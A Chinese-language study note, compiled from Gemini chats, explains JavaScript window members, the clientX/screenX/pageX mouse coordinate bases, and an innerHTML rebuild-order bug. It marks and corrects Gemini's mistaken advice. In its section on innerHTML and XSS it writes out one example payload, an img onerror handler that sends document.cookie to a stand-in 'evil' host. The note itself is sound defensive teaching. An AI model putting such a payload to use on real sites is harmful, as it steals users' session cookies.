---
title: "window 物件的三種成員（屬性／子物件／方法）與滑鼠座標四組基準，含 innerHTML 覆蓋節點的順序陷阱"
type: topic-note
source: Gemini
category: 技術
tags: [gemini, javascript, bom, window, dom, mouse-event, clientX, screenX, pageX, innerHTML, textContent, xss]
aliases: [window物件三種成員與滑鼠座標, clientX與screenX差在哪]
related:
  - "[[事件流與事件代理]]"
  - "[[textContent-innerText-innerHTML差異]]"
  - "[[createElement-動態建立元素]]"
  - "[[element-style動態設定-vs-className-切換]]"
  - "[[標準內建物件與全域物件-MDN十三大分類與static-vs-instance判準]]"
  - "[[javascript-url-XSS-實驗室]]"
  - "[[網頁座標點連線視覺化工具-GeoGebra-Plotly-Desmos與ThreeJS自製]]"
sources:
  - https://gemini.google.com/app/610b0499929080c2
  - https://gemini.google.com/app/71f8d00e99db5fbf
  - https://gemini.google.com/app/486991059afba88a
updated: 2026-09-19
---

# window 物件的三種成員與滑鼠座標四組基準

> 本篇重點 a–t，共 20 個。
> 互動版（含主軸流程圖、點擊填空、是非題、申論題）：`window物件三種成員與滑鼠座標-client-screen-page-與innerHTML覆蓋陷阱.html`
> 可執行範例：同層的 `mouse-coords-demo.html`

> [!info]- 🔗 與既有筆記的關聯（為什麼放在這一層）
> a. 本篇講的是「**瀏覽器提供的 window／事件物件長什麼樣、怎麼把值寫回畫面**」，屬於 DOM／BOM 的實作操作，所以歸進 `JS_CheatSheet_and_APIs/DOM/`，而不是講語言核心的 `JS_Core_and_Runtime/`。
> b. 與 [[事件流與事件代理]] 互補：那篇講「事件**怎麼傳**（捕獲→目標→冒泡）」，本篇講「事件物件**帶了哪些座標**、以及 listener 內部把值寫回 DOM 時的順序」。
> c. 與 [[textContent-innerText-innerHTML差異]] 互補：那篇做三者的語意對照，本篇補的是「**先 innerHTML 重建、再 getElementById 抓子節點**」這個執行順序的坑。
> d. 與 [[標準內建物件與全域物件-MDN十三大分類與static-vs-instance判準]] 互補：那篇分的是「**誰是內建物件**」，本篇分的是「**同一個 window 底下，哪個成員是屬性、哪個是子物件、哪個是方法**」的判準。

---

## 🎯 速答區

| # | 問題 | 一句話速答 | 章節 |
|---|---|---|---|
| Q1 | `window.innerWidth` 是物件還是屬性？ | 是**屬性**，它的值是一個 Number，後面接不了 `.` | §1 |
| Q2 | 怎麼一眼分出屬性／子物件／方法？ | 看兩件事：有沒有 `()`、後面能不能再接 `.` | §1 |
| Q3 | `e.clientX` 跟 `e.screenX` 差在哪？ | 原點不同。clientX 以**可視區左上角**為 (0,0)，screenX 以**實體螢幕左上角**為 (0,0) | §2 |
| Q4 | `e.screenX` 跟 `window.screenX` 又差在哪？ | 量的東西不同。前者量**滑鼠**離螢幕左緣，後者量**瀏覽器視窗**離螢幕左緣 | §2 |
| Q5 | 頁面捲動後，哪一組座標會變？ | 只有 `pageX/pageY` 會變，clientX 與 screenX 都不受捲動影響 | §2 |
| Q6 | 為什麼畫面印出 `1100319` 這種怪數字？ | `<span>` 的內容跟後面串接的 `window.screenX` 在 HTML 裡直接相鄰，視覺上黏成一串 | §3 |
| Q7 | 為什麼座標不會隨滑鼠即時更新？ | `el.innerHTML = msg` **每次都重建整棵子樹**，把剛寫好值的 `<span>` 換成了新的空節點 | §3 |
| Q8 | 正確的修法是什麼？ | 先 `innerHTML` 重建，**再** `getElementById` 抓新的 span 寫值；或乾脆不用 span，直接把數值串進 msg | §3 |
| Q9 | `getElementById` 抓不到會怎樣？ | 回傳 `null`，下一步寫 `.textContent` 就丟 `TypeError`，**listener 後面的程式全部不會跑** | §3 |
| Q10 | 這裡能不能把 innerHTML 換成 textContent？ | 不能。msg 裡有 `<h2>`／`<p>` 標籤，textContent 會把標籤當純文字原樣印出來 | §4 |

---

## 1. window 物件的三種成員：判準只有兩個問題

Gemini 原本的說法是「屬性是有 `()` 的寫法？」——<mark style="background: #FF5582A6;">這個方向剛好反了</mark>，<mark style="background: #BBFABBA6;">有 `()` 的是方法（Method），沒有 `()` 的才是屬性（Property）</mark>。

判準流程（主軸圖，互動版 HTML 有可點的版本）：

```text
          拿到一個 window 底下的成員名稱
                      │
                      ▼
          ┌───────────────────────────┐
          │ 問題 1：後面有小括號 () 嗎？│
          └───────────────────────────┘
                 │有            │沒有
                 ▼              ▼
         ┌──────────────┐  ┌────────────────────────────┐
         │ 方法 Method  │  │ 問題 2：後面還能再接 . 嗎？ │
         │ 本質是函式    │  └────────────────────────────┘
         │ alert()      │       │能              │不能
         │ open()       │       ▼                ▼
         │ print()      │  ┌──────────────┐ ┌──────────────┐
         └──────────────┘  │ 子物件        │ │ 屬性 Property│
                           │ Sub-object   │ │ 值是純量      │
                           │ location     │ │ innerWidth   │
                           │ document     │ │ innerHeight  │
                           │ history      │ │ pageXOffset  │
                           │ screen       │ └──────────────┘
                           └──────────────┘
                              │
                              └─► 子物件本身「也是一個屬性」，
                                  只是它的值剛好是另一個完整物件，
                                  所以可以 window.screen.width 一路往下鑽。
```

| 成員種類 | 判準 | window 上的例子 | 值的型別 | 後面能再接 `.` 嗎 |
|---|---|---|---|---|
| 屬性 Property | 無 `()`，值是純量 | `innerWidth`／`innerHeight`／`pageXOffset`／`screenX` | Number | 不能 |
| 子物件 Sub-object | 無 `()`，值是另一個物件 | `location`／`document`／`history`／`screen`／`navigator` | Object | 能 |
| 方法 Method | 有 `()` | `alert()`／`open()`／`print()`／`scrollTo()` | Function | 呼叫後看回傳值 |

> [!tip]+ 重點 e–g
> e. <mark style="background: #ADCCFFA6;">子物件在規格上其實就是「值為物件的屬性」</mark>，它不是第三種東西，只是為了教學好懂才獨立出來講。
> f. `window.history.length` 這一串要拆成兩步讀：**先存取 `history` 這個子物件，再讀它身上的 `length` 屬性**。`window.screen.width` 同理。
> g. 在瀏覽器裡 `window` 就是全域物件，所以 `window.innerWidth` 可以簡寫成 `innerWidth`；但 `document` 這種常用子物件通常也直接寫 `document`，兩種寫法指的是同一個東西。

---

## 2. 滑鼠座標：四組基準，差別只在「原點釘在哪」

這是整篇最常被搞混的地方。<mark style="background: #FFF3A3A6;">四組座標量的都是「距離」，差別純粹是原點 (0,0) 釘在畫面的哪一個角</mark>。

```text
┌──────────────────────────────────────────────────────┐ ← 實體螢幕左上角 = screenX/screenY 的原點 (0,0)
│  桌面                                                 │
│      ┌────────────────────────────────────┐          │
│      │ 瀏覽器視窗                           │          │
│      │  網址列／書籤列／工具列（不算在 client 內）│       │
│      │ ┌──────────────────────────────┐   │          │
│      │ │ viewport 可視區                │   │ ← 可視區左上角 = clientX/clientY 的原點 (0,0)
│      │ │                              │   │          │
│      │ │        ● 滑鼠指標             │   │          │
│      │ │                              │   │          │
│      │ └──────────────────────────────┘   │          │
│      └────────────────────────────────────┘          │
│      ↑                                                │
│      └── window.screenX：量的是「視窗左緣」離螢幕左緣有多遠 │
└──────────────────────────────────────────────────────┘

整份文件（含被捲動藏起來的部分）的左上角 = pageX/pageY 的原點 (0,0)
```

| 座標 | 原點 (0,0) 在哪 | 量的是誰 | 視窗被移動會變嗎 | 頁面被捲動會變嗎 | 典型用途 |
|---|---|---|---|---|---|
| `e.clientX` / `e.clientY` | 可視區 viewport 左上角 | 滑鼠指標 | 不會 | 不會 | 判斷滑鼠在畫面上的位置，配合 `getBoundingClientRect()` 做 hover 提示框 |
| `e.pageX` / `e.pageY` | 整份文件左上角（含捲動隱藏處） | 滑鼠指標 | 不會 | 會 | 在長文件上標記「文件座標」的錨點 |
| `e.screenX` / `e.screenY` | 實體螢幕左上角 | 滑鼠指標 | 會 | 不會 | 跨視窗／多螢幕的絕對定位 |
| `window.screenX` / `window.screenY` | 實體螢幕左上角 | 瀏覽器視窗本身的左上角 | 會 | 不會 | 算「視窗被拖到螢幕哪裡」，多螢幕時可能是負數 |
| `e.offsetX` / `e.offsetY` | 事件目標元素的 padding box 左上角 | 滑鼠指標 | 不會 | 不會 | 在 canvas／圖片上取「元素內」的相對座標 |

> [!important]+ 重點 h–k
> h. 三者的換算關係是 <mark style="background: #BBFABBA6;">`pageX = clientX + window.scrollX`</mark>，記住這一條就不用死背誰會被捲動影響。
> i. `window.screenX` 出現負數（例如 `-861`）<mark style="background: #ADCCFFA6;">不是壞掉</mark>，而是視窗被拖到主螢幕左邊的第二台螢幕上，主螢幕的左上角才是 (0,0)。
> j. `e.screenX` 與 `window.screenX` 名字幾乎一樣但主詞不同：<mark style="background: #FF5582A6;">一個主詞是滑鼠，一個主詞是視窗</mark>，把它們印在同一行就是下一節那個「數字黏成一串」的兇手。
> k. 舊筆記 `pageXOffset` 是 `window.scrollX` 的別名，兩者同義，現代寫法用 `scrollX`。

---

## 3. 那支程式的三個 bug：順序錯在哪

Abby 當時的程式做了這三件事，而三件事都出了問題：

```js
document.addEventListener('mousemove', function (e) {
  var msg = '<h2>browser window</h2><p>width:' + window.innerWidth + '</p>';
  // …略…
  msg += '<h2>滑鼠的X, Y座標</h2><p>X:<span id="mouseX"></span>' + window.screenX + '</p>'
       + '<p>Y:<span id="mouseY"></span>' + window.screenY + '</p>';

  var el = document.getElementById('info');
  el.innerHTML = msg;                                     // ← 這一行重建整棵子樹

  document.getElementById('mouseX').textContent = e.clientX;
  document.getElementById('mouseY').textContent = e.clientY;
  document.getElementById('clientX').textContent = e.clientX;  // ← id 根本不存在
});
```

### bug 1：兩組數字在 HTML 裡相鄰，視覺上黏成一串

`<span id="mouseX"></span>` 後面**緊接著**串上 `window.screenX`，渲染後的 DOM 是 `<p>X:<span>1100</span>319</p>`，瀏覽器不會幫你插空白，畫面上就看成 `1100319`。
&nbsp;&nbsp;&nbsp;&nbsp;Y 那行是 `<p>Y:<span>2</span>-861</p>` → `2-861`，因為 `e.clientY` 剛好只有一位數，兩行的總位數看起來就差很多。這不是「X 跟 Y 的精度不同」，<mark style="background: #FF5582A6;">而是兩個不相干的數字被串在一起</mark>。

### bug 2：抓不存在的 id，listener 從那一行起全部停擺

HTML 裡沒有 `id="clientX"`／`clientY"`／`screenX"`／`screenY"` 的元素，`document.getElementById('clientX')` 回傳 `null`，接著寫 `null.textContent = ...` 就丟：

```text
TypeError: Cannot set properties of null (setting 'textContent')
```

&nbsp;&nbsp;&nbsp;&nbsp;JS 例外會把**整個 listener 的剩餘程式中斷**，所以就算前兩行寫對了，後面該做的更新一律不會執行。

### bug 3（核心）：innerHTML 重建子樹，把剛抓到的節點換掉了

> [!danger]+ ⚠️ 存疑／更正：Gemini 這裡答錯了
> Gemini 當時說「問題出在 `msg` 是在監聽器外設定的，你可以把 `el.innerHTML = msg` 移除看看」，以及「`msg` 會重建 HTML 結構把節點覆蓋，所以必須**註解掉它**」。
> <mark style="background: #FF5582A6;">這兩句都不對</mark>：`msg` 明明就宣告在 listener 內部；而且把 `el.innerHTML = msg` 註解掉，`<span id="mouseX">` 根本不會被建出來，`getElementById` 只會回 `null`，畫面反而整個空白。
> <mark style="background: #BBFABBA6;">真正的原因是「順序」不是「存在」</mark>：`innerHTML` 是**整棵子樹重建**，賦值那一刻舊的 span 被丟掉、新的空 span 被建出來。只要保證「**先重建、再抓、再寫**」，這段程式就會正常跑。Abby 原本的寫法其實順序是對的，真正擋住它的是 bug 2 的 `TypeError`。

三種修法，由簡到繁：

| 修法 | 做法 | 適合場景 | 效能 |
|---|---|---|---|
| A 最簡單 | 不要用 span 佔位，直接把 `e.clientX` 串進 msg 字串裡一次寫完 | 整塊畫面本來就要重畫 | 每次 mousemove 重建整棵子樹，次數多時較貴 |
| B 折衷 | 骨架（`<h2>`／`<p>`／空 span）在 listener **外面**只建一次，listener 內只做 `span.textContent = e.clientX` | 只有數字會變 | 最好，完全不重建 DOM |
| C 安全優先 | 用 `document.createElement` 逐個建節點，文字一律走 `textContent` | 內容含使用者輸入 | 好，且無 XSS 風險 |

修法 A（對應 Gemini 給的修正版，把兩組座標分行標清楚）：

```js
document.addEventListener('mousemove', function (e) {
  var msg = '<h2>browser window</h2>'
          + '<p>width: ' + window.innerWidth + '</p>'
          + '<p>height: ' + window.innerHeight + '</p>'
          + '<h2>history</h2><p>items: ' + window.history.length + '</p>'
          + '<h2>screen</h2>'
          + '<p>width: ' + window.screen.width + '</p>'
          + '<p>height: ' + window.screen.height + '</p>'
          + '<h2>滑鼠座標</h2>'
          + '<p>Client X: ' + e.clientX + ' | Client Y: ' + e.clientY + '</p>'
          + '<p>Screen X: ' + e.screenX + ' | Screen Y: ' + e.screenY + '</p>'
          + '<p>Page   X: ' + e.pageX   + ' | Page   Y: ' + e.pageY   + '</p>';
  document.getElementById('info').innerHTML = msg;
});
```

修法 B（推薦，骨架只建一次，mousemove 只改文字）：

```js
var el = document.getElementById('info');
el.innerHTML = '<h2>滑鼠座標</h2>'
             + '<p>Client X: <span id="cx"></span> | Client Y: <span id="cy"></span></p>'
             + '<p>Screen X: <span id="sx"></span> | Screen Y: <span id="sy"></span></p>';

var cx = document.getElementById('cx');   // 骨架已存在，這時抓到的參照可以一直重用
var cy = document.getElementById('cy');
var sx = document.getElementById('sx');
var sy = document.getElementById('sy');

document.addEventListener('mousemove', function (e) {
  cx.textContent = e.clientX;             // 只改文字節點，不重建任何元素
  cy.textContent = e.clientY;
  sx.textContent = e.screenX;
  sy.textContent = e.screenY;
});
```

> [!tip]+ 重點 l–o
> l. <mark style="background: #FFF3A3A6;">`innerHTML` 賦值 ＝ 丟掉舊子樹、parse 字串、建新子樹</mark>，所有指向舊節點的變數在賦值後都變成**孤兒參照**（指著已不在文件裡的節點），寫進去畫面不會有反應。
> m. 因此「先抓節點、再 `innerHTML`、再寫值」一定失敗；順序必須是「**先 `innerHTML`、再抓、再寫**」，或者乾脆照修法 B 讓骨架只建一次。
> n. `getElementById` 找不到回的是 `null`（不是 `undefined`、也不會丟錯），<mark style="background: #ADCCFFA6;">錯是錯在下一步對 `null` 取屬性</mark>。養成 `var n = document.getElementById('x'); if (n) { ... }` 的習慣，或用 optional chaining `n?.textContent`。
> o. 在 `mousemove` 這種高頻事件裡每次都重建 DOM，捲動或快速移動時容易掉幀；要嘛用修法 B，要嘛把更新包進 `requestAnimationFrame` 節流。

---

## 4. innerHTML／textContent／createElement：這裡為什麼不能直接換成 textContent

| 寫法 | 瀏覽器怎麼處理字串 | 這個範例能用嗎 | XSS 風險 | 效能 |
|---|---|---|---|---|
| `el.innerHTML = msg` | 把字串當 HTML **parse**，`<h2>` 會變成真的標題元素 | 能，這正是範例要的 | 有。含使用者輸入時必須先 sanitize | 差，整棵子樹重建 |
| `el.textContent = msg` | 把字串當**純文字**，`<h2>` 會原樣印在畫面上 | 不能，畫面會印出 `<h2>browser window</h2>` 這串原始碼 | 無，瀏覽器自動 escape | 好 |
| `document.createElement` + `textContent` + `appendChild` | 逐個建節點，文字走 textContent | 能，最安全但最囉唆 | 無 | 好 |

> [!warning]+ 重點 p–r：innerHTML 的 XSS 邊界
> p. <mark style="background: #FF5582A6;">`innerHTML` 危險的前提是「字串裡混入了使用者可控的內容」</mark>。本範例的 msg 全部由 `window.innerWidth`、`e.clientX` 這類數值組成，<mark style="background: #BBFABBA6;">沒有任何使用者輸入，所以用 innerHTML 本身沒有資安問題</mark>，只有效能問題。
> q. 真正的危險長這樣：把留言板內容塞進 innerHTML，攻擊者送 `<img src="x" onerror="fetch('//evil/?c='+document.cookie)">`，瀏覽器一 parse 就執行 onerror，Cookie 外洩。注意 <mark style="background: #ADCCFFA6;">`innerHTML` 插入的 `<script>` 標籤**不會**被執行</mark>（HTML 規格如此），所以攻擊者改用事件處理屬性（onerror／onload）這條路。
> r. 現代作法：安全需求高就用 `textContent`／`createElement`；一定要插 HTML 就先過 [DOMPurify](https://github.com/cure53/DOMPurify) 或走 [Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)。React／Vue 預設會 escape 插值，所以框架底下不用自己擔心，除非你手動用了 `dangerouslySetInnerHTML`。

> [!note]+ 重點 s–t：順手記一下
> s. 範例最後那行 `alert('Current page: ' + window.location)` <mark style="background: #D2B3FFA6;">會在頁面一載入就跳窗、而且擋住後面的程式</mark>，示範時記得拿掉；`window.location` 被字串串接時會隱式呼叫 `toString()` 變成完整網址。
> t. `window.history.length` 讀的是**這個分頁的歷史筆數**（含前進後退），不是瀏覽器全部歷史；基於隱私，`history` 的實際 URL 清單是讀不到的。

---

## 5. 自己考自己：相關題目

| 平台 | 題號／名稱 | 為什麼相關 |
|---|---|---|
| LeetCode | 2694 Event Emitter | 手寫 `subscribe`／`emit`／`unsubscribe`，跟 `addEventListener`／`removeEventListener` 的心智模型一模一樣 |
| LeetCode | 2725 Interval Cancellation | 練「註冊了一個會重複觸發的東西，之後要怎麼收掉」，對應 mousemove listener 的清理 |
| LeetCode | 2637 Promise Time Limit | 練高頻事件的節流思維（配合本篇重點 o） |

連結：`https://leetcode.com/problems/event-emitter/`、`https://leetcode.com/problems/interval-cancellation/`、`https://leetcode.com/problems/promise-time-limit/`

---

## 各對話來源（原文）

### 網頁滑鼠座標顯示錯誤與修正（2026-09）— https://gemini.google.com/app/610b0499929080c2

**使用者：** 貼上整份 HTML，問「為何我的 Y 跟 X 的 Digits 位數不同」。

**Gemini：** 主要原因有兩個。其一，`<span id="mouseX"></span>` 後面緊接著 `window.screenX`，渲染後變成 `<p>X:<span>1100</span>319</p>`，畫面上直接連著顯示成 `1100319`；Y 那行是 `<p>Y:<span>2</span>-861</p>` → `2-861`。其二，`document.getElementById('clientX')` 等元素在 HTML 中並不存在，會導致 `TypeError: Cannot set properties of null` 並中斷執行。修正建議是把座標分行清楚串進 msg。

**使用者：** 「e.clientX 跟 screenX 差在哪」

**Gemini：** `e.clientX/clientY` 以瀏覽器可視區（Viewport）左上角為 (0,0)，不含網址列與工具列，且頁面捲動不影響它；`e.screenX/screenY` 以電腦實體螢幕左上角為 (0,0)，量的是滑鼠相對於整個螢幕的絕對距離；`window.screenX/screenY` 同樣以螢幕左上角為原點，但量的是瀏覽器視窗本身的偏移位置。補充：若需要滑鼠相對於整張網頁（含捲動隱藏部分）的座標，用 `e.pageX/pageY`。

### JS 滑鼠事件與即時座標更新（2026-09）— https://gemini.google.com/app/71f8d00e99db5fbf

（語音輸入，逐字稿多處辨識錯字，以下照錄。）

**使用者：** 「怎麼樣可以讓這邊的城市碼顯示是即時更動的，隨著我滑鼠進入的 mouse or mouse move 就可以？改變數字。我這邊的 jazz 的順序錯在哪？」

**Gemini：** 「我先研究一下這段 JavaScript 代碼。確保你的滑鼠移動事件傾聽器有正確捕捉到事件物件，並在函式之內透過該物件來更新畫面上顯示的滑鼠座標。」

**使用者：** 「對啊，這邊順序錯拿了。為什麼現在人在動的時候沒有？」

**Gemini：** 「你的代碼邏輯是正確的，但問題出在 `msg` 變量是在監聽器外設定的，導致畫面無法隨時更新，你可以嘗試把這一行 `el.innerHTML = msg.replace(...)` 移除看看。」 ⚠️ **此句有誤，見 §3 bug 3。**

**使用者：** 「為什麼（用）乙醜（clientX）？」

**Gemini：** 「因為使用 clientX 與 clientY 可以精準捕捉到滑鼠在視窗中的確切座標，這樣才能確保畫面的數值是隨著滑鼠移動即時更新的。」

**使用者：** 「為什麼要把 el 內聯樣式的 msg 註解掉？」

**Gemini：** 「因為 `msg` 會重建 HTML 結構，將原本監聽器想更新的節點覆蓋，所以必須註解掉它，才能順利更新數值。」 ⚠️ **前半句（重建覆蓋）對，後半句（註解掉）錯，見 §3 bug 3。**

**使用者：** 「不行啊。」

**Gemini：** 「抱歉讓你困擾了，我們再檢查一下代碼。你現在的 `el.innerHTML` 設定是在—」（回答被截斷）

### JavaScript Window 物件與屬性解析（2026-09）— https://gemini.google.com/app/486991059afba88a

**使用者：**（附書本照片）「他說的 window 子物件是哪一個？我只看到 window.innerWidth，innerWidth 算物件還是屬性？」

**Gemini：** 圖片提到的 window 子物件指的是 `window.history` 與 `window.screen`。`window.history.length` 是先存取 history 子物件再讀它的 length 屬性；`window.screen.width`／`window.screen.height` 同理。`innerWidth` 是「屬性」不是物件，它回傳一個數值，本身無法再透過點號延伸存取其他子屬性。

**使用者：** 「所以這邊都是物件對嗎？屬性是有 () 的寫法？」

**Gemini：** 不是全部都是物件，而且帶有 `()` 的是方法（Method）而不是屬性。物件成員分三種：（1）屬性 Property，沒有小括號，儲存資料或數值，例如 `window.innerHeight`／`innerWidth`／`pageXOffset`；（2）子物件 Sub-object，本身也是屬性但值指向另一個完整物件，底下還能繼續用 `.` 存取，例如 `window.location`／`document`／`history`／`screen`；（3）方法 Method，帶有小括號，本質是函式，例如 `window.alert()`／`open()`／`print()`。快速分辨：無 `()` 且是數值／字串 → 屬性；無 `()` 且底下還能接 `.` → 子物件；有 `()` → 方法。

**使用者：** 「innerHTML 不是不好的做法嗎？怎麼我用 textContent？」

**Gemini：** `innerHTML` 確實有資安與效能風險，但這個範例無法直接改用 `textContent`，因為 msg 字串含有 `<h2>` 與 `<p>` 標籤，用 textContent 會把標籤當純文字印出來。`innerHTML` 被詬病的主因是 XSS（Cross-Site Scripting）：若插入的內容含使用者可自由輸入的資料，惡意使用者可能注入 `<script>` 或 `<img src="x" onerror="惡意程式碼">`，導致 Cookie 或敏感資訊外洩。適用時機：只更新純文字用 textContent（安全且效能好，會自動 escape）；需要動態渲染 HTML 結構才用 innerHTML（資料含使用者輸入時必須先 sanitize）。若不想用 innerHTML，方法 A 是用 `document.createElement` 逐步建立（最安全），方法 B 是交給 React／Vue 等框架自動處理 XSS 防護。

---

## 資料來源（含查證時間）

| 主題 | 連結 | 版本／時間 |
|---|---|---|
| 對話原文：網頁滑鼠座標顯示錯誤與修正 | `https://gemini.google.com/app/610b0499929080c2` | Gemini Flash，2026-09，擷取於 2026-09-19 |
| 對話原文：JS 滑鼠事件與即時座標更新 | `https://gemini.google.com/app/71f8d00e99db5fbf` | Gemini Flash，2026-09，擷取於 2026-09-19 |
| 對話原文：JavaScript Window 物件與屬性解析 | `https://gemini.google.com/app/486991059afba88a` | Gemini Flash，2026-09，擷取於 2026-09-19 |
| MouseEvent.clientX 定義與座標基準 | `https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent/clientX` | MDN，查證於 2026-09-19 |
| MouseEvent.pageX 與 scrollX 的換算 | `https://developer.mozilla.org/en-US/docs/Web/API/MouseEvent/pageX` | MDN，查證於 2026-09-19 |
| Window.screenX 定義 | `https://developer.mozilla.org/en-US/docs/Web/API/Window/screenX` | MDN，查證於 2026-09-19 |
| Element.innerHTML 安全性說明（script 不會被執行、事件屬性會） | `https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations` | MDN，查證於 2026-09-19 |
| Node.textContent 與 XSS 差異 | `https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent` | MDN，查證於 2026-09-19 |
| DOMPurify（HTML sanitizer） | `https://github.com/cure53/DOMPurify` | v3 系列，查證於 2026-09-19 |

---

*由 Gemini 對話自動整理 · 更新於 2026-09-19*
